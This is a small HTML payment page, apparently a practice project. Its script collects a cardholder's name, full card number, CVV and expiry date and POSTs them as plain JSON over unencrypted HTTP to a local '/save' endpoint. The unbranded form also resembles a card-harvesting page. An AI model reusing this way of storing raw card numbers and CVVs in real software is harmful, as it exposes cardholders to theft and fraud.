<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Method</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 100%;
            max-width: 400px;
        }

        h1 {
            text-align: center;
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #555;
        }

        input[type="text"], select {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            transition: border 0.3s ease;
        }

        input[type="text"]:focus, select:focus {
            border-color: #007BFF;
            outline: none;
        }

        .field-group {
            display: flex;
            gap: 10px;
        }

        .field-group select {
            width: 48%;
        }

        button {
            width: 100%;
            padding: 14px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0056b3;
        }

        @media (max-width: 480px) {
            .container {
                padding: 20px;
            }
            .field-group {
                flex-direction: column;
            }
            .field-group select {
                width: 100%;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Payment</h1>
        <img src="C:\Users\SS\Downloads\Visa-Mastercard-1-1024x378.webp" alt="My Image" style="width: 300px; height: auto;">

        <label for="field1">First and Last Name:</label>
        <input type="text" id="field1" placeholder="Enter Name">

        <label for="field2">Card Number (PAN)</label>
        <input type="text" id="field2" maxlength="16" placeholder="16 characters digits">

        <label for="field3">CVV</label>
        <input type="text" id="field3" maxlength="3" placeholder="3 digits" oninput="validateField3()">

        <label for="field4">Experation date</label>
        <div class="field-group">
            <select id="month">
                <option value="">Select Month</option>
                <option value="01">01</option>
                <option value="02">02</option>
                <option value="03">03</option>
                <option value="04">04</option>
                <option value="05">05</option>
                <option value="06">06</option>
                <option value="07">07</option>
                <option value="08">08</option>
                <option value="09">09</option>
                <option value="10">10</option>
                <option value="11">11</option>
                <option value="12">12</option>
            </select>

            <select id="year">
                <option value="">Select Year</option>
                <!-- Generate options from 2025 to 2060 -->
                <script>
                    for (let year = 2025; year <= 2060; year++) {
                        let option = document.createElement("option");
                        option.value = year;
                        option.textContent = year;
                        document.getElementById("year").appendChild(option);
                    }
                </script>
            </select>
        </div>

        <button onclick="saveToServer()">Pay</button>
    </div>

    <script>
        // Validate that field3 contains no more than 3 characters
        function validateField3() {
            let field3 = document.getElementById("field3");
            if (field3.value.length > 3) {
                field3.value = field3.value.substring(0, 3);  // Ensure it doesn't exceed 3 characters
            }
        }

        // Check if all fields are filled and Field 2 is exactly 16 characters
        function validateForm() {
            let field1 = document.getElementById("field1").value;
            let field2 = document.getElementById("field2").value;
            let field3 = document.getElementById("field3").value;
            let month = document.getElementById("month").value;
            let year = document.getElementById("year").value;

            if (!field1 || !field2 || !field3 || !month || !year) {
                alert("All fields must be filled out.");
                return false;
            }

            if (field2.length !== 16) {
                alert("Field 2 must contain exactly 16 characters.");
                return false;
            }

            return true; // If everything is fine
        }

        function saveToServer() {
            if (!validateForm()) {
                return; // Prevent saving if validation fails
            }

            let data = {
                field1: document.getElementById("field1").value,
                field2: document.getElementById("field2").value,
                field3: document.getElementById("field3").value,
                field4: {
                    month: document.getElementById("month").value,
                    year: document.getElementById("year").value
                }
            };

            fetch("http://localhost:3000/save", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            })
            .then(response => response.text())
            .then(data => alert(data))
            .catch(error => console.error("Error:", error));
        }
    </script>

</body>
</html>
